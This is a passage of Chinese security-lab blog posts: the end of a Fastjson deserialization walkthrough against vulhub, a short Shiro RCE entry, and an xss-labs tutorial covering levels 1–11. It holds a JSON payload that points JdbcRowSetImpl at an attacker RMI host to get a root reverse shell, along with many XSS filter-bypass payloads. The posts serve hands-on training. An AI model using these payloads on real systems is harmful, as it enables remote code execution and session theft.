<p> 在漏洞页面bp抓包后post提交数据，替换如下payload：</p>
<p>注意有需要四个需要修改的</p>
<blockquote>
<p>POST</p>
<p>-—————————————————————————-</p>
<p>Accept:  <em>/</em></p>
<p>-—————————————————————————-</p>
<p>Content-Type: application/json</p>
<p>-—————————————————————————-</p>
<p>{  </p>
<p>  “b”:{<br>     “@type”:”com.sun.rowset.JdbcRowSetImpl”,<br>     “dataSourceName”:”rmi://攻击机IP:9999/TouchFile”,<br>     “autoCommit”:true<br>   }<br> }</p>
</blockquote>
<p>send 发送数据包</p>
<p><img src="https://img-blog.csdnimg.cn/a981c38c654e493eb05594671b2dd457.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>在攻击机上监听反弹shell的端口</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081030976.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>whoami : root权限</p>
<p> <img src="https://img-blog.csdnimg.cn/f3cd016ae10f4d49a7e888a033968194.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARXJZYW83,size_11,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="-1"><a href="#-1" class="headerlink" title></a></h1><h1 id="补充小知识"><a href="#补充小知识" class="headerlink" title="补充小知识"></a>补充小知识</h1><h2 id="HTTP协议的-accept-是什么意思"><a href="#HTTP协议的-accept-是什么意思" class="headerlink" title="HTTP协议的 accept:*/*是什么意思"></a>HTTP协议的 accept:*/*是什么意思</h2><p>*/*就是接收任意类型。</p>
<h2 id="ubuntu下切换-java-版本"><a href="#ubuntu下切换-java-版本" class="headerlink" title="ubuntu下切换 java 版本"></a>ubuntu下切换 java 版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">　　update-alternatives --config java</span><br><span class="line">　　update-alternatives --config javac</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081030405.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/44dbd36faab1402b868dd3cceb03e8b0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h1><h2 id="Java-RMI服务远程命令执行利用"><a href="#Java-RMI服务远程命令执行利用" class="headerlink" title="Java RMI服务远程命令执行利用"></a>Java RMI服务远程命令执行利用</h2><p><a href="https://blog.csdn.net/u011721501/article/details/50725582">Java RMI服务远程命令执行利用_Exploit的小站~-CSDN博客_rmi服务</a></p>
<h2 id="java-反序列化利用工具-marshalsec-使用简介"><a href="#java-反序列化利用工具-marshalsec-使用简介" class="headerlink" title="java 反序列化利用工具 marshalsec 使用简介"></a>java 反序列化利用工具 marshalsec 使用简介</h2><p><a href="https://blog.csdn.net/whatday/article/details/107942941">java 反序列化利用工具 marshalsec 使用简介_whatday的专栏-CSDN博客</a></p>
]]></content>
      <tags>
        <tag>vulhub漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>vulhub漏洞—shiro框架</title>
    <url>/2021/12/08/vulhub%E6%BC%8F%E6%B4%9E%E2%80%94shiro%E6%A1%86%E6%9E%B6/</url>
    <content><![CDATA[<p> <strong>shiro框架 反序列化rce 利用工具一把梭</strong></p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081004784.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 使用漏扫工具Xary</p>
<blockquote>
<p>xray_windows_amd64.exe webscan –url <a href="http://xxx/">http://xxx/</a> –html-output 125.html</p>
</blockquote>
<span id="more"></span>

<p><img src="https://img-blog.csdnimg.cn/0a53d3e7e4624779a17e0dc736e80227.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 发现是shiro框架漏洞</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081004852.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 使用工具一把梭，工具在github上自行下载</p>
<p>RCE </p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081004958.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
]]></content>
      <tags>
        <tag>vulhub漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>xss-labs（level1-16）保姆级教程</title>
    <url>/2021/11/04/xss-labs%EF%BC%88level1-16%EF%BC%89%E4%BF%9D%E5%A7%86%E7%BA%A7%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<hr>
<h1 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h1><p>分析页面可得，传参 name=test ，页面回显参数的值test，以及参数的长度</p>
<p><img src="https://img-blog.csdnimg.cn/f517a5fe202a4c6eb7dbd2cab2e87418.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 分析源码，我们可以看到它将name的值赋给 $str 并在</p><h2></h2>标签中调用<p></p>
<p><img src="https://img-blog.csdnimg.cn/69b4ed75c56c4057938dd7adb0d54773.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>那么 就很明显，这一关主要就是考察反射型xss</p>
<p><img src="https://img-blog.csdnimg.cn/0b5db93a84ae420f8357cf87c8909646.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>但是由于不知道服务器端对于提交的敏感字符有没有过滤，</p>
<p>所以这里直接在name参数中赋值一个简单的弹窗来进行测试。</p>
<p><img src="https://img-blog.csdnimg.cn/8b4480c591f948ae85d76afa3d9853f9.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>我们可以看到 js的弹窗代码 顺利执行了 </p>
<span id="more"></span>

<h1 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h1><p>这关我们可以发现多了一个文本框，我们先用之前的语句填入文本框里面，发现不行</p>
<p><img src="https://img-blog.csdnimg.cn/c91cd3d2b6a84453b6001527d0e2ff6e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"> 分析源码，我们发现 htmlspecialchars($str) 对keyword参数的值进行了处理。</p>
<p>htmlspecialchars() 函数</p>
<p>​    把预定义的字符 “&lt;” （小于）和 “&gt;” （大于）转换为 HTML 实体 （<a href="https://blog.csdn.net/weixin_53144068/article/details/111035712">html字符实体</a>），把 &lt; 和 &gt; 转换为实体常用于防止浏览器将其用作 HTML 元素。但是用户又需要在页面上显示输入时，转换为HTML实体能防止代码的运行。如在xss的防御中就能够体现。</p>
<p>​    这个函数是把预定义的字符转换为 HTML 实体，说明把<code>&lt;script&gt;</code>标签吃掉了，那么我们的突破口就在value这里。</p>
<p><img src="https://img-blog.csdnimg.cn/3294ff4cf9bd44bdb60828d58d8d4419.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 我们可以通过闭合标签，使得<code>&lt;input name=keyword value=&quot;&#39;.$str.&#39;&quot;&gt;</code>这一句就闭合掉，即在<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>前面加<code>&quot;&gt;</code>，对前面input标签进行闭合。</p>
<p><img src="https://img-blog.csdnimg.cn/39cee2bd63f64ab9a9b8bcdb56b7fb6b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 再此尝试注入，成功</p>
<p><img src="https://img-blog.csdnimg.cn/43884d807d73479f9efbdcaf334f7755.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h1><p>​    使用第二关的码测试一下，发现没用。</p>
<p>​    分析源码，发现不仅对<code>&quot;</code>号做了防御，并且value这里也加了<code>htmlspecialchars</code>函数</p>
<p>​    虽然对了双引号做了防御，但是却放行单引号，这种情况我们可以通过事件标签触发表单执行。<img src="https://img-blog.csdnimg.cn/f67ff98ec6434bc490ca1757a0af9c96.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 这种情况我们可以通过事件标签触发表单执行，即通过使用HTML的事件知识对其注入。</p>
<p><a href="https://www.runoob.com/tags/ref-eventattributes.html">html事件<img src="https://csdnimg.cn/release/blog_editor_html/release1.9.3/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=LA23" alt=" ">https://www.runoob.com/tags/ref-eventattributes.html</a></p>
<p>这里我们用到了</p>
<p>onclick </p>
<p><img src="https://img-blog.csdnimg.cn/d632d6b3bfd449ad933ce517c5a5555c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; onclick=&#x27;alert(&quot;xss&quot;)&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>单引号闭合</p>
<p>提交url之后<strong>需要点击输入框，触发事件</strong>（ onclick 当单击鼠标时运行脚本）</p>
<p><img src="https://img-blog.csdnimg.cn/9b4fe84c36554d15b262b55386236505.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h1><p>分析源码 我们发现 &lt; 和 &gt; 被替换成 空格</p>
<p>且 value 的闭合条件为 双引号 </p>
<p><img src="https://img-blog.csdnimg.cn/c6b9c0b0d6264ca8af652d803a990b23.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/82ff8a6e866748a9842f3570968822b6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">与上一关一致，更改单引号为双引号</p>
<p>点击文本框触发事件 </p>
<p><img src="https://img-blog.csdnimg.cn/1fd2ed30b44f4dd8925c8a6c486c7a14.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h1><p>我们发现它对&lt;script和on的都做了特殊处理，而且还使用<code>strtolower</code>函数对所有字符串变成小写，单引号也不可用了</p>
<p>还是可以闭合语句，通过双引号加&gt;闭合 （ 加 &gt; 是因为要闭合input标签，之后写入自己的标签）</p>
<p><img src="https://img-blog.csdnimg.cn/773cac3d10a1443f97c14a505866ba4f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>javascript伪协议以及标签进行注入<br> 使用javascript伪协议以及标签进行注入，就是在代码前面加上javascript:，在这里的标签不一定只是链接标签，还可以其他标签，可以自己了解。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&gt; &lt;a href=&#x27;javascript:alert(/xss/)&#x27;&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/fac2ae0dcab144e4b980417a27b9e84c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h1><p>尝试使用之前的注入方式失败</p>
<p>分析源码，我们发现他虽然过滤了很多，但相比较5关没有使用<code>strtolower</code>函数（对所有字符串变成小写） 所以可以考虑大小写绕过</p>
<p><img src="https://img-blog.csdnimg.cn/a1b30294406341e5a8da8fbd27abb6b8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;a HREF=&#x27;javascRIPT:alert(/xss/)&#x27;&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>&gt;&lt;scRipt&gt;alert(/xss/)&lt;/scRipt&gt;</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/e1f18cefa5014227af20d03e012c5dda.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h1><p>分析源码，发现相比之前过滤的东西更多了，但是它却把特殊语义的字符串修改成了空字符串，且只过滤一次，我们可双写绕过</p>
<p><img src="https://img-blog.csdnimg.cn/97012654cf124e759500bdae6a0ac7b2.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> “&gt; 对input标签闭合</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;sscriptcript&gt;alert(/xss/)&lt;/sscriptcript&gt;</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/7172bd63a6ec4ff79caa4300abca3009.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h1><p>分析源码我们会发现之前的方法都不可以使用了</p>
<p> 但是我们会发现有一个友情链接，与我们之前与使用的javascript为协议一致</p>
<p>这里将是一个突破口，由于script被过滤了但是我们可以尝试将script实体化</p>
<p><img src="https://img-blog.csdnimg.cn/a78f55371eb049f799bbbcafc3601fb3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>实体化（转换工具自行百度）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">javascript:alert(/xss/)</span><br><span class="line"></span><br><span class="line">&amp;#<span class="number">106</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">118</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">115</span>;&amp;#<span class="number">99</span>;&amp;#<span class="number">114</span>;&amp;#<span class="number">105</span>;&amp;#<span class="number">112</span>;&amp;#<span class="number">116</span>;&amp;#<span class="number">58</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">108</span>;&amp;#<span class="number">101</span>;&amp;#<span class="number">114</span>;&amp;#<span class="number">116</span>;&amp;#<span class="number">40</span>;&amp;#<span class="number">47</span>;&amp;#<span class="number">120</span>;&amp;#<span class="number">115</span>;&amp;#<span class="number">115</span>;&amp;#<span class="number">47</span>;&amp;#<span class="number">41</span>;</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/4d321a66696248cf94ab31a56d4b96c9.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 我们需要将这串字符写入 文本框中 再点击添加友情链接 最后点击友情链接 即可成功</p>
<p>（通过hackar提交是不可行，做这关的时候给我郁闷坏了，前几关都可以）</p>
<p>在浏览器中查看一下源码，验证一下我们的想法，和第五关使用的javascript伪协议一致</p>
<p><img src="https://img-blog.csdnimg.cn/0051e1299da04c2d9eefcafbdc9b3528.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="level9"><a href="#level9" class="headerlink" title="level9"></a><img src="https://img-blog.csdnimg.cn/a4d6789d1c324aa1b2f262feaedbb817.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">level9</h1><p>分析源码发现 在第八关的基础上加了一个判断语句</p>
<p><img src="https://img-blog.csdnimg.cn/b7d15ba494d84d2ba508342ff487a8ab.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>strpos（）函数，结合判断语句，我们必须在代码中加入http:// 但是并没有过滤HTML实体编码，所以我们还是使用编码绕过。</p>
<p><img src="https://img-blog.csdnimg.cn/9209ec1aeedb47ed94657390249d584b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 使用过滤HTML实体编码，但是由于需要加入http://，肯定不能在http://后面加代码，必须在前面，并且将http://注释掉才能执行。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">javasc&amp;#<span class="number">114</span>;ipt:alert(/xss/)<span class="comment">//http://</span></span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/3a8f2e17bba8417ab8e5850bc245951b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h1><p>这一关使用之前的方法都无法成功，我们可以分析一下源码</p>
<p>我们通过url 传入的keyword参数只是处理了一下便输出了，没有可以注入的地方。</p>
<p>但是我们还会发现这里有三个input标签，三个钟只有最后一个标签可以下手。</p>
<p>这里有一个隐藏的参数t_sort，代码只是过滤了&lt; 和&gt;并没有其他操作。</p>
<p>我们可以从这里入手，我们可以使用触发事件标签进行。</p>
<p><img src="https://img-blog.csdnimg.cn/2a1d81e0a52b4daf8b404b8c5d04f1bd.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>还有一点要注意的是，由于页面上没有文本框，所以我们需要在url后面的添加 type=”text”（或者修改源码将hidden,修改为text）</p>
<p>提交url 后页面上会显示一个文本框 ，点击即可过关。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">t_sort=<span class="string">&quot; type=&quot;</span>text<span class="string">&quot; onclick=&quot;</span>alert(<span class="string">&#x27;xss&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/ef28dcd118a14d7a83ec955c050b09f3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id><a href="#" class="headerlink" title></a></h1><h1 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h1><p><img src="https://img-blog.csdnimg.cn/b7873bac7f5e4292969b5f0c9ef51559.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>分析源码，我们发现有一句是之前没有见过的</p>
<p>$str11=$_SERVER[‘HTTP_REFERER’];</p>
<p>$_SERVER[‘HTTP_REFERER’]可以获取当前链接的上一个连接的来源地址，即链接到当前页面的前一页面的 URL 地址，可以做到防盗链作用，只有点击超链接（即<A href="...">） 打开的页面才有HTTP_REFERER环境变量， 其它如 window.open()、 window.location=…、window.showModelessDialog()等打开的窗口都没有HTTP_REFERER 环境变量。</A></p>
<p><img src="https://img-blog.csdnimg.cn/c7f65f9cd80b47d6aa95a9aeebc593a8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
